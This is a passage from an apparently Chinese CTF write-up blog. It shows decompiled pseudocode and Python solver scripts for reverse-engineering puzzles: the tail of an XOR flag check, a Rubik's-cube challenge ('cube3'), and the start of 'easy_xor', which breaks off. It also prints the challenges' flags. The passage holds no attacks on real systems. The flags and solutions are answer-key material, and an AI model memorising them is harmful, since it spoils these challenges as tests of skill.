class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  wuhuwuhu((<span class="built_in">int</span>)s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != *(_BYTE *)(enc + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    printf(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    printf(<span class="string">&quot;try again!&quot;</span>);</span><br><span class="line">  end_m(p_argc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl wuhuwuhu(<span class="built_in">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+<span class="number">8</span>h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + a1) ^= *(_BYTE *)(i + <span class="number">1</span> + a1);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要逻辑：接收输入然后循环异或输入（元素1和元素2异或的结果替换元素1），然后和目标数组比较，但是目标数组是动态的，因此需要动态调试<br>拿到目标数组后反过来异或就可以了</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x17</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x38</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, <span class="number">0x1D</span>, <span class="number">0x17</span>, <span class="number">0x52</span>, <span class="number">0x5C</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[<span class="built_in">len</span>(s)<span class="number">-2</span>-i] = s[<span class="built_in">len</span>(s)<span class="number">-2</span>-i] ^ s[<span class="built_in">len</span>(s)<span class="number">-1</span>-i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;0yn4mic_d3bug_yyds!&#125;</code></p><h2 id="cube3"><a href="#cube3" class="headerlink" title="cube3"></a>cube3</h2><p>题目描述</p><ol><li>你玩过三阶魔方吗,你能看懂R U R’ U’这样的公式吗,这里有4个魔方等你来还原</li><li>公式(步骤)格式例如R U’ R U R U R U’ R’ U’ R2’ &lt;回车&gt;,每步操作用空格分开,逆时针加上’字符</li><li>flag格式为xsctf{formula},其中formula为4个魔方的还原步骤依次连在一起,去掉空格,取其md5</li><li>本题在Ubuntu22下编译,请不要使用ubuntu18<blockquote><p>6个面，一共24种旋转操作，分析时需要对号入座</p></blockquote></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Bh] [rbp-3B5h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-3B4h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">160</span>]; <span class="comment">// [rsp+10h] [rbp-3B0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">40</span>]; <span class="comment">// [rsp+B0h] [rbp-310h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">160</span>]; <span class="comment">// [rsp+150h] [rbp-270h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9[<span class="number">114</span>]; <span class="comment">// [rsp+1F0h] [rbp-1D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+3B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cube_init((__int64)v9);</span><br><span class="line">  print_menu(v9, argv);</span><br><span class="line">  v4 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="string">&#x27;0&#x27;</span> || v4 &gt; <span class="number">52</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">53</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;bye!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    formula_get_by_id((__int64)v6, v4 - <span class="number">48</span>);</span><br><span class="line">    cube_scramble((__int64)v9, (__int64)v6);</span><br><span class="line">    cube_print((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v9);</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    formula_input((<span class="keyword">char</span> *)v7);</span><br><span class="line">    <span class="keyword">while</span> ( v7[v5] != <span class="number">24</span> )</span><br><span class="line">      cube_rotating((__int64)v9, v7[v5++]);</span><br><span class="line">    cube_print((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v9);</span><br><span class="line">    formula_reverse(v7, v8);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)cube_isorigin(v9) || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)formula_cmp(v6, v8) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cube_isorigin(v9) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)formula_cmp(v6, v8) )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Restore successfully!!!But not reverse!!!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Restore failed!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Restore successfully!!!You reversed the formula!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;press anykey to continue...&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">~$ .&#x2F;cube3</span><br><span class="line">                           三阶魔方</span><br><span class="line">        _______________________________________________</span><br><span class="line">        |                                             |</span><br><span class="line">        |        请输入编号:                           |</span><br><span class="line">        |       1.打乱1     2.打乱2                    |</span><br><span class="line">        |       3.打乱3     4.打乱4                    |</span><br><span class="line">        |       5.退出程序                             |</span><br><span class="line">        |                                             |</span><br><span class="line">        |                                             |</span><br><span class="line">        -----------------------------------------------</span><br><span class="line">                    请输入编号[1&#x2F;2]:4</span><br><span class="line">                            ________________</span><br><span class="line">                            |  2 |  3 |  3 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                            |  2 |  4 |  4 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                            |  5 |  3 |  6 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                           &#x2F;  4 &#x2F; 5  &#x2F; 1  &#x2F;|</span><br><span class="line">                          &#x2F;____&#x2F;____&#x2F;____&#x2F; |</span><br><span class="line">                         &#x2F;  1 &#x2F;  1 &#x2F;  6 &#x2F;|3+</span><br><span class="line">                        &#x2F;____&#x2F;____&#x2F;____&#x2F; |&#x2F;|</span><br><span class="line">                       &#x2F;  3 &#x2F;  5 &#x2F;  1 &#x2F;|1|1|</span><br><span class="line">        ______________&#x2F;____&#x2F;____&#x2F;____&#x2F;4|&#x2F;|&#x2F;|</span><br><span class="line">        | 1 |  5 |  5 |  2 |  4 |  6 |&#x2F;|6+1|</span><br><span class="line">        +---+----+----+----+----+----+6|&#x2F;|&#x2F;</span><br><span class="line">        | 5 |  5 |  2 |  6 |  3 |  3 |&#x2F;|6+</span><br><span class="line">        +---+----+----+----+----+----+2|&#x2F;</span><br><span class="line">        | 6 |  2 |  3 |  6 |  3 |  5 |&#x2F;</span><br><span class="line">        +---+----+----+----+----+----+</span><br><span class="line">                      |  2 |  1 |  4 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">                      |  4 |  2 |  4 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">                      |  4 |  2 |  5 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">Enter a formula and separate each step with a space</span><br><span class="line">Tip: The format of the operation is like R2 R2&#39; R</span><br><span class="line">[&#39;] represents a counterclockwise rotation</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>需要输入魔方的公式<br><a href="https://zhuanlan.zhihu.com/p/396215313">【初级篇】三阶魔方入门教程 - 知乎 (zhihu.com)</a></p><p>要还原魔方，最简单的方法是反着拧<br>要反着拧，就要找到打乱的顺序</p><p>ida大部分函数看不懂没关系，可以凭感觉找到存储打乱顺序的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">formula_get_by_id</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-294h]</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">162</span>]; <span class="comment">// [rsp+20h] [rbp-290h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+2A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x280</span>uLL);</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">23</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">3</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">4</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">5</span>] = <span class="number">9</span>;</span><br><span class="line">  v4[<span class="number">6</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">7</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">8</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">9</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">10</span>] = <span class="number">20</span>;</span><br><span class="line">  v4[<span class="number">11</span>] = <span class="number">11</span>;</span><br><span class="line">  v4[<span class="number">12</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">13</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">14</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">15</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">16</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">17</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">18</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">19</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">20</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">40</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">41</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">42</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">43</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">44</span>] = <span class="number">1</span>;</span><br><span class="line">  v4[<span class="number">45</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">46</span>] = <span class="number">2</span>;</span><br><span class="line">  v4[<span class="number">47</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">48</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">49</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">50</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">51</span>] = <span class="number">10</span>;</span><br><span class="line">  v4[<span class="number">52</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">53</span>] = <span class="number">21</span>;</span><br><span class="line">  v4[<span class="number">54</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">55</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">56</span>] = <span class="number">17</span>;</span><br><span class="line">  v4[<span class="number">57</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">58</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">59</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">60</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">80</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">81</span>] = <span class="number">15</span>;</span><br><span class="line">  v4[<span class="number">82</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">83</span>] = <span class="number">2</span>;</span><br><span class="line">  v4[<span class="number">84</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">85</span>] = <span class="number">17</span>;</span><br><span class="line">  v4[<span class="number">86</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">87</span>] = <span class="number">9</span>;</span><br><span class="line">  v4[<span class="number">88</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">89</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">90</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">91</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">92</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">93</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">94</span>] = <span class="number">11</span>;</span><br><span class="line">  v4[<span class="number">95</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">96</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">97</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">98</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">99</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">100</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">120</span>] = <span class="number">20</span>;</span><br><span class="line">  v4[<span class="number">121</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">122</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">123</span>] = <span class="number">21</span>;</span><br><span class="line">  v4[<span class="number">124</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">125</span>] = <span class="number">23</span>;</span><br><span class="line">  v4[<span class="number">126</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">127</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">128</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">129</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">130</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">131</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">132</span>] = <span class="number">0x16</span>;</span><br><span class="line">  v4[<span class="number">134</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">135</span>] = <span class="number">1</span>;</span><br><span class="line">  v4[<span class="number">136</span>] = <span class="number">0x12</span>;</span><br><span class="line">  v4[<span class="number">137</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">138</span>] = <span class="number">0x12</span>;</span><br><span class="line">  v4[<span class="number">139</span>] = <span class="number">0xB</span>;</span><br><span class="line">  v4[<span class="number">140</span>] = <span class="number">0x18</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v4[<span class="number">40</span> * a2 - <span class="number">40</span> + i] != <span class="number">24</span>; ++i )</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4L</span>L * i) = v4[<span class="number">40</span> * a2 - <span class="number">40</span> + i];</span><br><span class="line">  *(_DWORD *)(<span class="number">4L</span>L * i + a1) = <span class="number">24</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为题目说一共有24种操作，刚好是v4元素的取值范围-1<br>减一的原因是因为有四个魔方，最大的元素（24）的作用类似分隔符，通过主函数的while语句也可以判断出来，而且整个v4数组刚好被值为24的元素分隔成4部分，刚好对应4个魔方</p><p>因此可以将这些元素提取出来（有坑），然后映射到对应的公式，再反着输出就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s = <span class="built_in">open</span>(<span class="string">&#x27;./tmp.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">ss = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    num = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(i)):</span><br><span class="line">        <span class="keyword">if</span> i[j] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            num = i[j+<span class="number">1</span>:<span class="number">-2</span>]</span><br><span class="line">    ss.append(<span class="built_in">int</span>(num))</span><br><span class="line"></span><br><span class="line">rotate = [</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;U\&#x27;&#x27;</span>, <span class="string">&#x27;U2&#x27;</span>, <span class="string">&#x27;U2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;D\&#x27;&#x27;</span>, <span class="string">&#x27;D2&#x27;</span>, <span class="string">&#x27;D2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;F\&#x27;&#x27;</span>, <span class="string">&#x27;F2&#x27;</span>, <span class="string">&#x27;F2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;B\&#x27;&#x27;</span>, <span class="string">&#x27;B2&#x27;</span>, <span class="string">&#x27;B2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L\&#x27;&#x27;</span>, <span class="string">&#x27;L2&#x27;</span>, <span class="string">&#x27;L2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;R\&#x27;&#x27;</span>, <span class="string">&#x27;R2&#x27;</span>, <span class="string">&#x27;R2\&#x27;&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ss:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">24</span>:</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(rotate[i], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss)<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">if</span> ss[i] == <span class="number">24</span>:</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> rotate[ss[i]]:</span><br><span class="line">            print(rotate[ss[i]<span class="number">-1</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(rotate[ss[i]+<span class="number">1</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print()</span><br><span class="line">sss = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">B2&#x27; D&#x27; L2&#x27; F&#x27; D2&#x27; B2&#x27; R2&#x27; B F2 R&#x27; D2 B L2&#x27; B&#x27; F L2&#x27; F&#x27; D&#x27; U2 R2</span></span><br><span class="line"><span class="string">B&#x27; D2 F&#x27; L D2 L2 R L2 F2&#x27; D2&#x27; L2 R2&#x27; F&#x27; U2&#x27; D&#x27; U B D2 R2&#x27; D2&#x27;</span></span><br><span class="line"><span class="string">R2&#x27; D2&#x27; L2&#x27; D B2&#x27; F2 U2 B&#x27; D L2&#x27; B&#x27; D2 F B&#x27; L D U2&#x27; L2 B2 D</span></span><br><span class="line"><span class="string">F2 L2&#x27; D2 L2&#x27; U F&#x27; U&#x27; R2&#x27; U2 D2 L2&#x27; U2 B L2 R2 B2&#x27; R D2 B&#x27; R&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ssss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sss:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&#x27; &#x27;</span> <span class="keyword">and</span> i != <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        ssss += i</span><br><span class="line"></span><br><span class="line">print(ssss)</span><br></pre></td></tr></table></figure><p>这样就可以得到四个魔方的解法，可以使用程序验证，最后再将解法按照题目要求处理就行</p><p><code>xsctf&#123;0a15a3168e6bf08df8178186312b0396&#125;</code></p><p>坑</p><ul><li>v4数组的定义种少了一个元素<code>v4[133]</code>，需要动态调试得到这个元素的值</li><li>因为是4个魔方一起反着输出，所以第一个魔方的解法应该对应第四行的输出</li><li>最后串起来的时候是<code>第一个魔方的解法+第二个魔方的解法...</code>，即第四行+第三行+…</li></ul><h2 id="easy-xor"><a href="#easy-xor" class="headerlink" title="easy_xor"></a>easy_xor</h2><p>核心代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 